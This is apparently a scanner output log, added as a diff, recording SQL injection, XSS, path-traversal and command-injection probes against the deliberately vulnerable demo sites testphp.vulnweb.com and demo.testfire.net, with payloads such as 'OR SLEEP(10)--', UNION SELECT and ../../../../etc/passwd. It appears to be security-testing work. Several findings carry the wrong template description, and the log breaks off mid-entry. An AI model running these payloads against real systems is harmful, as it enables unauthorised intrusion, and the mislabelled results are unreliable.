@@ -1,0 +1,2249 @@
+Timestamp: 2025-05-17 13:41:40
+Target: http://testphp.vulnweb.com/
+Template: sql_injection_advanced.yaml
+Vulnerabilities Found:
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=1--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR SLEEP(10)--' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=1--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT 1,2,3--' at line 1
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT 1,2,3--' at line 1
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR SLEEP(10)--' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=2--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=2--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+
+Timestamp: 2025-05-17 13:46:15
+Target: http://testphp.vulnweb.com/
+Template: xss-detection.yaml
+Vulnerabilities Found:
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<script>alert('xss')</script>
+  Payload: <script>alert('xss')</script>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')</script>'' at line 1
+  Severity: low
+  Description: Detects Reflected Cross-Site Scripting (XSS) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/XSS
+  Author: nghia
+  Tags: xss, injection
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<svg+onload=alert('xss')>
+  Payload: <svg+onload=alert('xss')>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')>'' at line 1
+  Severity: low
+  Description: Detects Reflected Cross-Site Scripting (XSS) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/XSS
+  Author: nghia
+  Tags: xss, injection
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<img+src=x+onerror=alert('xss')>
+  Payload: <img+src=x+onerror=alert('xss')>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')>'' at line 1
+  Severity: low
+  Description: Detects Reflected Cross-Site Scripting (XSS) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/XSS
+  Author: nghia
+  Tags: xss, injection
+
+Timestamp: 2025-05-17 13:49:30
+Target: http://testphp.vulnweb.com/
+Template: lfi-rce-detection.yaml
+Vulnerabilities Found:
+- Endpoint: http://testphp.vulnweb.com/index.php?file=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+- Endpoint: http://testphp.vulnweb.com/index.php?file=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+
+Timestamp: 2025-05-17 13:53:06
+Target: http://demo.testfire.net
+Template: ssrf-detection.yaml
+No vulnerabilities found.
+
+Timestamp: 2025-05-17 13:57:09
+Target: http://demo.testfire.net
+Template: sensitive-data-exposure.yaml
+Vulnerabilities Found:
+- Endpoint: http://demo.testfire.net/api/user_info
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://demo.testfire.net/error.php?debug=true
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+
+Timestamp: 2025-05-17 18:09:19
+Target: http://demo.testfire.net
+Template: xss-detection.yaml
+Vulnerabilities Found:
+- Endpoint: http://demo.testfire.net/update_profile.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://demo.testfire.net/admin
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://demo.testfire.net/api/user_info
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://demo.testfire.net/account_details.php?account_id=256
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://demo.testfire.net/profile.php?user_id=691
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://demo.testfire.net/admin/dashboard.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://demo.testfire.net/transfer_funds.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://demo.testfire.net/error.php?debug=true
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+- Endpoint: http://demo.testfire.net/manage_users.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Cross-Site Request Forgery (CSRF) vulnerabilities by checking for missing CSRF tokens in state-changing requests.
+  Reference: https://owasp.org/www-community/attacks/csrf
+  Author: nghia
+  Tags: csrf, security
+
+Timestamp: 2025-05-17 19:20:34
+Target: http://testphp.vulnweb.com/
+Template: sql_injection_advanced.yaml
+Vulnerabilities Found:
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=1--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT 1,2,3--' at line 1
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=1--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR SLEEP(10)--' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=2--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR SLEEP(10)--' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT 1,2,3--' at line 1
+  Severity: low
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=2--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects SQL Injection vulnerabilities using advanced payloads.
+  Reference: https://owasp.org/www-community/attacks/SQL_Injection
+  Author: nghia
+  Tags: sqli, injection, time-based, union-based, boolean-based
+
+Timestamp: 2025-05-17 19:37:29
+Target: http://testphp.vulnweb.com/
+Template: lfi-rce-detection.yaml
+Vulnerabilities Found:
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+- Endpoint: http://testphp.vulnweb.com/index.php?file=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+- Endpoint: http://testphp.vulnweb.com/index.php?file=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Local File Inclusion (LFI) and Remote Code Execution (RCE) vulnerabilities.
+  Reference: https://owasp.org/www-community/attacks/Local_File_Inclusion, https://owasp.org/www-community/attacks/Remote_Code_Execution
+  Author: nghia
+  Tags: lfi, rce, injection
+
+Timestamp: 2025-05-17 19:41:45
+Target: http://testphp.vulnweb.com
+Template: xss-detection.yaml
+Vulnerabilities Found:
+- Endpoint: http://testphp.vulnweb.com/api/user_info
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/admin
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/update_profile.php
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/index.php?file=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/profile.php?user_id=525
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=../../../../etc/passwd
+  Payload: ../../../../etc/passwd
+  Type: LFI
+  Verified: No
+  Severity: medium
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/account_details.php?account_id=113
+  Payload: 
+  Type: Unknown
+  Severity: low
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR SLEEP(10)--' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/index.php?cmd=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+AND+1=2--
+  Payload: 1'+AND+1=2--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=2--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION SELECT 1,2,3--' at line 1
+  Severity: low
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=<svg+onload=alert('xss')>
+  Payload: <svg+onload=alert('xss')>
+  Type: XSS
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'xss')>'' at line 1
+  Severity: low
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/listproducts.php?cat=1'+AND+1=1--
+  Payload: 1'+AND+1=1--
+  Type: Boolean-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND 1=1--' at line 1
+  Boolean-based Verified: Yes
+  Severity: high
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/index.php?file=whoami
+  Payload: whoami
+  Type: RCE
+  Verified: Yes
+  Severity: critical
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Severity: low
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' OR SLEEP(10)--' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/search.php?test=1'+OR+SLEEP(10)--
+  Payload: 1'+OR+SLEEP(10)--
+  Type: Time-based
+  Error: 		Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+  Time-based Verified: Yes
+  Severity: critical
+  Description: Detects Sensitive Data Exposure by checking for exposed sensitive information in API responses or error messages.
+  Reference: https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
+  Author: nghia
+  Tags: sensitive-data, security
+- Endpoint: http://testphp.vulnweb.com/artists.php?artist=1'+UNION+SELECT+1,2,3--
+  Payload: 1'+UNION+SELECT+1,2,3--
+  Type: Union-based
